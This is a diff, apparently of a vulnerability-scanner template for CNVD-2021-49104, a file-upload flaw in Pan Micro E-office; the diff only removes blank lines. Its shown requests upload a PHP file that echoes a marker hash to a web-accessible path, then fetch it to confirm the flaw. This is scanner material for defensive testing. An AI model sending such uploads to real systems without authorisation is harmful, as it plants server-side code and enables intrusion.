@@ -1,5 +1,4 @@
 id: CNVD-2021-49104
-
 info:
   name: Pan Micro E-office File Uploads
   author: pikpikcu
@@ -14,7 +13,6 @@ info:
     cwe-id: CWE-434
   remediation: Pan Wei has released an update to resolve this vulnerability.
   tags: pan,micro,cnvd,cnvd2021
-
 requests:
   - raw:
       - |
@@ -29,18 +27,15 @@ requests:
         <?php echo md5('CNVD-2021-49104');?>
 
         --e64bdf16c554bbc109cecef6451c26a4--
-
       - |
         GET /images/logo/logo-eoffice.php HTTP/1.1
         Host: {{Hostname}}
-
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
           - "94d01a2324ce38a2e29a629c54190f67"
-
       - type: status
         status:
           - 200
